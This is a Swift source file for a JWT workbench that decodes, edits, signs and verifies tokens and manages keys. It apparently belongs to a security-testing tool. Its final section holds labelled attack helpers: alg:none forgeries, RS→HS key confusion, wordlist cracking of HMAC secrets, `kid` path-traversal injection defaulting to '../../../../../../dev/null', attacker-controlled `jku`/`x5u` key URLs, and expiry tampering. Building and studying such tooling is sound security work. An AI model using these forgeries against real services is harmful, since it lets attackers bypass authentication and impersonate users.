// GulpCodec — the JWT Workbench core (F12 §2.3 / ADV-010…ADV-013): decode any JWT, edit claims and
// re-sign (HS256/384/512, RS256/384/512, PS256/384/512, ES256/384/512), verify against a key or a
// JWKS, import/export keys (PEM, JWK), generate keys, and the labelled attack helpers: `alg:none`
// variants, RS→HS algorithm confusion (the public key as the HMAC secret), weak-secret brute force
// from a wordlist, `kid`/`jku`/`x5u` header injection, and `exp`/`nbf` manipulation.
//
// Tokens are kept as their exact segments: re-encoding a header or payload the user didn't change
// keeps its original bytes (so a re-signed token differs only where it was edited).

import Crypto
import Foundation
import _CryptoExtras

/// A decoded JWT (JWS compact serialization).
public struct JWT: Sendable, Equatable {
    /// The header segment as it appears (base64url).
    public var headerSegment: String
    /// The payload segment as it appears (base64url).
    public var payloadSegment: String
    /// The signature segment (base64url, may be empty).
    public var signatureSegment: String

    /// The decoded header JSON bytes.
    public var headerJSON: [UInt8] { (try? Base64.decode(Array(headerSegment.utf8), url: true)) ?? [] }
    /// The decoded payload bytes (usually JSON).
    public var payloadJSON: [UInt8] { (try? Base64.decode(Array(payloadSegment.utf8), url: true)) ?? [] }
    /// The signature bytes.
    public var signature: [UInt8] { (try? Base64.decode(Array(signatureSegment.utf8), url: true)) ?? [] }
    /// `header.payload.signature`.
    public var compact: String { "\(headerSegment).\(payloadSegment).\(signatureSegment)" }
    /// What is signed: `header.payload`.
    public var signingInput: [UInt8] { Array("\(headerSegment).\(payloadSegment)".utf8) }

    /// The header as a dictionary.
    public var header: [String: Any] {
        (try? JSONSerialization.jsonObject(with: Data(headerJSON))) as? [String: Any] ?? [:]
    }
    /// The payload as a dictionary (claims).
    public var claims: [String: Any] {
        (try? JSONSerialization.jsonObject(with: Data(payloadJSON))) as? [String: Any] ?? [:]
    }
    /// The `alg` header.
    public var algorithm: String { header["alg"] as? String ?? "" }

    /// Parse a compact JWT (surrounding whitespace and a `Bearer ` prefix are ignored).
    public init(_ token: String) throws {
        var text = token.trimmingCharacters(in: .whitespacesAndNewlines)
        if text.lowercased().hasPrefix("bearer ") {
            text = String(text.dropFirst(7)).trimmingCharacters(in: .whitespaces)
        }
        let parts = text.split(separator: ".", omittingEmptySubsequences: false).map(String.init)
        guard parts.count == 3 || (parts.count == 2) else {
            throw CodecError("a JWT has three dot-separated parts")
        }
        headerSegment = parts[0]
        payloadSegment = parts[1]
        signatureSegment = parts.count == 3 ? parts[2] : ""
        guard (try? JSONSerialization.jsonObject(with: Data(headerJSON))) is [String: Any] else {
            throw CodecError("the JWT header is not Base64URL-encoded JSON")
        }
    }

    /// A token from segments.
    public init(headerSegment: String, payloadSegment: String, signatureSegment: String) {
        self.headerSegment = headerSegment
        self.payloadSegment = payloadSegment
        self.signatureSegment = signatureSegment
    }

    /// `{"header": …, "payload": …}` pretty-printed (the Decoder's `jwt-decode`).
    public static func decodeForDisplay(_ token: String) throws -> [UInt8] {
        let jwt = try JWT(token)
        var object: [String: Any] = ["header": jwt.header]
        if let payload = try? JSONSerialization.jsonObject(with: Data(jwt.payloadJSON)) {
            object["payload"] = payload
        } else {
            object["payload"] = String(decoding: jwt.payloadJSON, as: UTF8.self)
        }
        object["signature"] = Hex.encode(jwt.signature)
        return [UInt8](
            try JSONSerialization.data(
                withJSONObject: object, options: [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]))
    }

    static func segment(_ object: [String: Any]) throws -> String {
        let data = try JSONSerialization.data(
            withJSONObject: object, options: [.sortedKeys, .withoutEscapingSlashes])
        return String(decoding: Base64.encodeURL([UInt8](data)), as: UTF8.self)
    }

    static func segment(bytes: [UInt8]) -> String { String(decoding: Base64.encodeURL(bytes), as: UTF8.self) }

    /// This token with header fields set (nil removes) — the payload segment is kept as is.
    public func withHeader(_ changes: [String: Any?]) throws -> JWT {
        var header = self.header
        for (key, value) in changes {
            if let value { header[key] = value } else { header.removeValue(forKey: key) }
        }
        return JWT(
            headerSegment: try Self.segment(header), payloadSegment: payloadSegment,
            signatureSegment: signatureSegment)
    }

    /// This token with claims set (nil removes) — the header segment is kept as is.
    public func withClaims(_ changes: [String: Any?]) throws -> JWT {
        var claims = self.claims
        for (key, value) in changes {
            if let value { claims[key] = value } else { claims.removeValue(forKey: key) }
        }
        return JWT(
            headerSegment: headerSegment, payloadSegment: try Self.segment(claims),
            signatureSegment: signatureSegment)
    }

    /// This token re-signed with `key` using `algorithm` (the header's `alg` is set to it).
    public func signed(_ algorithm: String, key: JWTKey) throws -> JWT {
        var token = self
        if self.algorithm != algorithm { token = try withHeader(["alg": algorithm]) }
        token.signatureSegment = Self.segment(
            bytes: try JWTSigner.sign(token.signingInput, algorithm: algorithm, key: key))
        return token
    }

    /// Whether the signature verifies with `key` (the header's `alg` decides how).
    public func verifies(with key: JWTKey) -> Bool {
        (try? JWTSigner.verify(signature, input: signingInput, algorithm: algorithm, key: key)) ?? false
    }
}

/// An elliptic curve for ES256/384/512.
public enum ECCurve: String, Sendable, Hashable, Codable, CaseIterable {
    case p256 = "P-256", p384 = "P-384", p521 = "P-521"

    /// The JWS algorithm that uses this curve.
    public var algorithm: String {
        switch self {
        case .p256: "ES256"
        case .p384: "ES384"
        case .p521: "ES512"
        }
    }
}

/// A key for signing or verifying. EC keys are kept as their raw bytes (swift-crypto's EC key
/// types aren't Sendable) and rebuilt when used.
public enum JWTKey: Sendable {
    /// An HMAC secret.
    case secret([UInt8])
    /// An RSA private key.
    case rsaPrivate(_RSA.Signing.PrivateKey)
    /// An RSA public key.
    case rsaPublic(_RSA.Signing.PublicKey)
    /// An EC private key (its raw scalar).
    case ecPrivate(ECCurve, [UInt8])
    /// An EC public key (raw x‖y).
    case ecPublic(ECCurve, [UInt8])

    /// A key from PEM text (RSA or EC, private or public), or nil.
    public static func pem(_ text: String) -> JWTKey? {
        if let key = try? _RSA.Signing.PrivateKey(pemRepresentation: text) { return .rsaPrivate(key) }
        if let key = try? _RSA.Signing.PublicKey(pemRepresentation: text) { return .rsaPublic(key) }
        if let key = try? P256.Signing.PrivateKey(pemRepresentation: text) {
            return .ecPrivate(.p256, Array(key.rawRepresentation))
        }
        if let key = try? P256.Signing.PublicKey(pemRepresentation: text) {
            return .ecPublic(.p256, Array(key.rawRepresentation))
        }
        if let key = try? P384.Signing.PrivateKey(pemRepresentation: text) {
            return .ecPrivate(.p384, Array(key.rawRepresentation))
        }
        if let key = try? P384.Signing.PublicKey(pemRepresentation: text) {
            return .ecPublic(.p384, Array(key.rawRepresentation))
        }
        if let key = try? P521.Signing.PrivateKey(pemRepresentation: text) {
            return .ecPrivate(.p521, Array(key.rawRepresentation))
        }
        if let key = try? P521.Signing.PublicKey(pemRepresentation: text) {
            return .ecPublic(.p521, Array(key.rawRepresentation))
        }
        return nil
    }

    /// A key from a JWK (`kty` RSA, EC or oct; private parts used when present).
    public static func jwk(_ object: [String: Any]) throws -> JWTKey {
        func part(_ name: String) throws -> [UInt8] {
            guard let text = object[name] as? String else { throw CodecError("JWK has no \"\(name)\"") }
            return try Base64.decode(Array(text.utf8), url: true)
        }
        switch object["kty"] as? String {
        case "oct": return .secret(try part("k"))
        case "RSA":
            if object["d"] != nil {
                return .rsaPrivate(
                    try _RSA.Signing.PrivateKey(
                        n: part("n"), e: part("e"), d: part("d"), p: part("p"), q: part("q")))
            }
            return .rsaPublic(try _RSA.Signing.PublicKey(n: part("n"), e: part("e")))
        case "EC":
            guard let curve = (object["crv"] as? String).flatMap(ECCurve.init(rawValue:)) else {
                throw CodecError("unsupported EC curve")
            }
            if object["d"] != nil { return .ecPrivate(curve, try part("d")) }
            return .ecPublic(curve, try part("x") + part("y"))
        default: throw CodecError("unsupported JWK kty")
        }
    }

    /// The keys of a JWKS document (`{"keys": [...]}`), with their `kid`s; unusable entries are skipped.
    public static func jwks(_ data: Data) throws -> [(kid: String?, key: JWTKey)] {
        guard let object = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
            let keys = object["keys"] as? [[String: Any]]
        else { throw CodecError("not a JWKS document: expected {\"keys\": [...]}") }
        return keys.compactMap { entry in (try? jwk(entry)).map { (entry["kid"] as? String, $0) } }
    }

    /// The public half (secrets are their own public half).
    public var publicKey: JWTKey {
        switch self {
        case .rsaPrivate(let key): return .rsaPublic(key.publicKey)
        case .ecPrivate(let curve, let raw):
            return (try? ECKeys.publicRaw(curve, privateRaw: raw)).map { .ecPublic(curve, $0) } ?? self
        default: return self
        }
    }

    /// The public key as PEM (nil for secrets).
    public var publicPEM: String? {
        switch publicKey {
        case .rsaPublic(let key): key.pemRepresentation
        case .ecPublic(let curve, let raw): try? ECKeys.publicPEM(curve, raw)
        default: nil
        }
    }

    /// The private key as PEM (nil for public keys and secrets).
    public var privatePEM: String? {
        switch self {
        case .rsaPrivate(let key): key.pemRepresentation
        case .ecPrivate(let curve, let raw): try? ECKeys.privatePEM(curve, raw)
        default: nil
        }
    }

    /// The public JWK (`kid` added when given).
    public func publicJWK(kid: String? = nil) throws -> [String: Any] {
        func b64(_ bytes: some DataProtocol) -> String {
            String(decoding: Base64.encodeURL(Array(bytes)), as: UTF8.self)
        }
        var jwk: [String: Any]
        switch publicKey {
        case .secret(let bytes): jwk = ["kty": "oct", "k": b64(bytes)]
        case .rsaPublic(let key):
            let primitives = try key.getKeyPrimitives()
            jwk = ["kty": "RSA", "n": b64(primitives.modulus), "e": b64(primitives.publicExponent)]
        case .ecPublic(let curve, let raw):
            let half = raw.count / 2
            jwk = [
                "kty": "EC", "crv": curve.rawValue, "x": b64(raw.prefix(half)), "y": b64(raw.suffix(half)),
            ]
        default: throw CodecError("no public key")
        }
        if let kid { jwk["kid"] = kid }
        return jwk
    }

    /// Generate a key for `algorithm` (HS*: 32 random bytes; RS*/PS*: RSA-2048; ES256/384/512).
    public static func generate(for algorithm: String) throws -> JWTKey {
        switch algorithm.prefix(2).uppercased() {
        case "HS": return .secret((0..<32).map { _ in UInt8.random(in: 0...255) })
        case "RS", "PS": return .rsaPrivate(try _RSA.Signing.PrivateKey(keySize: .bits2048))
        case "ES":
            switch algorithm.uppercased() {
            case "ES384": return .ecPrivate(.p384, Array(P384.Signing.PrivateKey().rawRepresentation))
            case "ES512": return .ecPrivate(.p521, Array(P521.Signing.PrivateKey().rawRepresentation))
            default: return .ecPrivate(.p256, Array(P256.Signing.PrivateKey().rawRepresentation))
            }
        default: throw CodecError("unknown algorithm \(algorithm)")
        }
    }
}

/// Rebuilds swift-crypto EC keys from raw bytes.
enum ECKeys {
    static func publicRaw(_ curve: ECCurve, privateRaw: [UInt8]) throws -> [UInt8] {
        switch curve {
        case .p256:
            Array(try P256.Signing.PrivateKey(rawRepresentation: privateRaw).publicKey.rawRepresentation)
        case .p384:
            Array(try P384.Signing.PrivateKey(rawRepresentation: privateRaw).publicKey.rawRepresentation)
        case .p521:
            Array(try P521.Signing.PrivateKey(rawRepresentation: privateRaw).publicKey.rawRepresentation)
        }
    }

    static func publicPEM(_ curve: ECCurve, _ raw: [UInt8]) throws -> String {
        switch curve {
        case .p256: try P256.Signing.PublicKey(rawRepresentation: raw).pemRepresentation
        case .p384: try P384.Signing.PublicKey(rawRepresentation: raw).pemRepresentation
        case .p521: try P521.Signing.PublicKey(rawRepresentation: raw).pemRepresentation
        }
    }

    static func privatePEM(_ curve: ECCurve, _ raw: [UInt8]) throws -> String {
        switch curve {
        case .p256: try P256.Signing.PrivateKey(rawRepresentation: raw).pemRepresentation
        case .p384: try P384.Signing.PrivateKey(rawRepresentation: raw).pemRepresentation
        case .p521: try P521.Signing.PrivateKey(rawRepresentation: raw).pemRepresentation
        }
    }

    static func sign(_ curve: ECCurve, _ raw: [UInt8], _ input: [UInt8]) throws -> [UInt8] {
        switch curve {
        case .p256:
            Array(
                try P256.Signing.PrivateKey(rawRepresentation: raw).signature(for: SHA256.hash(data: input))
                    .rawRepresentation)
        case .p384:
            Array(
                try P384.Signing.PrivateKey(rawRepresentation: raw).signature(for: SHA384.hash(data: input))
                    .rawRepresentation)
        case .p521:
            Array(
                try P521.Signing.PrivateKey(rawRepresentation: raw).signature(for: SHA512.hash(data: input))
                    .rawRepresentation)
        }
    }

    static func verify(_ curve: ECCurve, _ raw: [UInt8], _ signature: [UInt8], _ input: [UInt8]) -> Bool {
        switch curve {
        case .p256:
            guard let key = try? P256.Signing.PublicKey(rawRepresentation: raw),
                let value = try? P256.Signing.ECDSASignature(rawRepresentation: signature)
            else { return false }
            return key.isValidSignature(value, for: SHA256.hash(data: input))
        case .p384:
            guard let key = try? P384.Signing.PublicKey(rawRepresentation: raw),
                let value = try? P384.Signing.ECDSASignature(rawRepresentation: signature)
            else { return false }
            return key.isValidSignature(value, for: SHA384.hash(data: input))
        case .p521:
            guard let key = try? P521.Signing.PublicKey(rawRepresentation: raw),
                let value = try? P521.Signing.ECDSASignature(rawRepresentation: signature)
            else { return false }
            return key.isValidSignature(value, for: SHA512.hash(data: input))
        }
    }
}

/// Signs and verifies JWS signatures.
enum JWTSigner {
    static func sign(_ input: [UInt8], algorithm: String, key: JWTKey) throws -> [UInt8] {
        let alg = algorithm.uppercased()
        switch (alg, key) {
        case ("NONE", _): return []
        case ("HS256", .secret(let secret)):
            return Array(HMAC<SHA256>.authenticationCode(for: input, using: SymmetricKey(data: secret)))
        case ("HS384", .secret(let secret)):
            return Array(HMAC<SHA384>.authenticationCode(for: input, using: SymmetricKey(data: secret)))
        case ("HS512", .secret(let secret)):
            return Array(HMAC<SHA512>.authenticationCode(for: input, using: SymmetricKey(data: secret)))
        case (_, .rsaPrivate(let rsa)) where alg.hasPrefix("RS") || alg.hasPrefix("PS"):
            let padding: _RSA.Signing.Padding = alg.hasPrefix("PS") ? .PSS : .insecurePKCS1v1_5
            let signature: _RSA.Signing.RSASignature
            switch alg.suffix(3) {
            case "384": signature = try rsa.signature(for: SHA384.hash(data: input), padding: padding)
            case "512": signature = try rsa.signature(for: SHA512.hash(data: input), padding: padding)
            default: signature = try rsa.signature(for: SHA256.hash(data: input), padding: padding)
            }
            return Array(signature.rawRepresentation)
        case (_, .ecPrivate(let curve, let raw)) where curve.algorithm == alg:
            return try ECKeys.sign(curve, raw, input)
        default: throw CodecError("a \(algorithm) signature needs a matching private key or secret")
        }
    }

    static func verify(_ signature: [UInt8], input: [UInt8], algorithm: String, key: JWTKey) throws -> Bool {
        let alg = algorithm.uppercased()
        switch (alg, key.publicKey) {
        case (_, .secret) where alg.hasPrefix("HS"):
            let expected = try sign(input, algorithm: alg, key: key)
            return expected.count == signature.count
                && zip(expected, signature).reduce(0) { $0 | ($1.0 ^ $1.1) } == 0
        case (_, .rsaPublic(let rsa)) where alg.hasPrefix("RS") || alg.hasPrefix("PS"):
            let padding: _RSA.Signing.Padding = alg.hasPrefix("PS") ? .PSS : .insecurePKCS1v1_5
            let value = _RSA.Signing.RSASignature(rawRepresentation: signature)
            switch alg.suffix(3) {
            case "384": return rsa.isValidSignature(value, for: SHA384.hash(data: input), padding: padding)
            case "512": return rsa.isValidSignature(value, for: SHA512.hash(data: input), padding: padding)
            default: return rsa.isValidSignature(value, for: SHA256.hash(data: input), padding: padding)
            }
        case (_, .ecPublic(let curve, let raw)) where curve.algorithm == alg:
            return ECKeys.verify(curve, raw, signature, input)
        default: return false
        }
    }
}

/// A forged token and what it tries (ADV-011, each clearly labelled).
public struct JWTForgery: Sendable, Equatable {
    /// What the token tests, e.g. "alg:none (\"None\")".
    public var label: String
    /// The token.
    public var token: String
}

/// The JWT attack helpers (ADV-011).
public enum JWTAttacks {
    /// Unsigned tokens with `alg` set to each casing of `none` (and an empty signature).
    public static func algNone(_ jwt: JWT) throws -> [JWTForgery] {
        try ["none", "None", "NONE", "nOnE"].map { alg in
            var token = try jwt.withHeader(["alg": alg])
            token.signatureSegment = ""
            return JWTForgery(label: "alg:none (\"\(alg)\")", token: token.compact)
        }
    }

    /// RS→HS algorithm confusion: HS256-sign with the server's public key (as PEM text, and the
    /// variants servers commonly read: with and without the trailing newline) as the HMAC secret.
    public static func keyConfusion(_ jwt: JWT, publicKeyPEM: String, algorithm: String = "HS256") throws
        -> [JWTForgery]
    {
        let trimmed = publicKeyPEM.trimmingCharacters(in: .whitespacesAndNewlines)
        var seen: Set<String> = []
        return try [trimmed + "\n", trimmed].filter { seen.insert($0).inserted }.map { secret in
            let token = try jwt.signed(algorithm, key: .secret(Array(secret.utf8)))
            let variant =
                secret.hasSuffix("\n") ? "PEM with trailing newline" : "PEM without trailing newline"
            return JWTForgery(label: "RS→\(algorithm) confusion (\(variant))", token: token.compact)
        }
    }

    /// The HMAC secret from `wordlist` that verifies `jwt` (HS256/384/512), or nil.
    public static func crack(_ jwt: JWT, wordlist: [String]) -> String? {
        guard jwt.algorithm.uppercased().hasPrefix("HS") else { return nil }
        let input = jwt.signingInput
        let signature = jwt.signature
        for word in wordlist
        where (try? JWTSigner.sign(input, algorithm: jwt.algorithm, key: .secret(Array(word.utf8))))
            == signature
        {
            return word
        }
        return nil
    }

    /// `kid` injection: point `kid` at a predictable file (default `/dev/null` by path traversal)
    /// and HS256-sign with that file's contents (empty for `/dev/null`).
    public static func kidInjection(
        _ jwt: JWT, kid: String = "../../../../../../dev/null", secret: [UInt8] = []
    ) throws -> JWTForgery {
        let token = try jwt.withHeader(["kid": kid]).signed("HS256", key: .secret(secret))
        return JWTForgery(
            label: "kid injection (\(kid), HS256 with the file's contents)", token: token.compact)
    }

    /// `jku`/`x5u` injection: point the key URL at one you control and sign with your key (serve its
    /// JWKS / certificate at `url`).
    public static func keyURLInjection(
        _ jwt: JWT, header: String = "jku", url: String, key: JWTKey, algorithm: String = "RS256"
    )
        throws -> JWTForgery
    {
        let token = try jwt.withHeader([header: url]).signed(algorithm, key: key)
        return JWTForgery(label: "\(header) injection (\(url))", token: token.compact)
    }

    /// Expiry manipulation (unsigned changes — re-sign them with a key you hold): `exp` far in the
    /// future, `exp` removed, `nbf` in the past.
    public static func timeClaims(_ jwt: JWT, now: Date = Date()) throws -> [JWTForgery] {
        let future = Int(now.timeIntervalSince1970) + 10 * 365 * 24 * 3600
        let past = Int(now.timeIntervalSince1970) - 3600
        return [
            JWTForgery(label: "exp +10 years", token: try jwt.withClaims(["exp": future]).compact),
            JWTForgery(label: "exp removed", token: try jwt.withClaims(["exp": nil]).compact),
            JWTForgery(label: "nbf an hour ago", token: try jwt.withClaims(["nbf": past]).compact),
        ]
    }
}
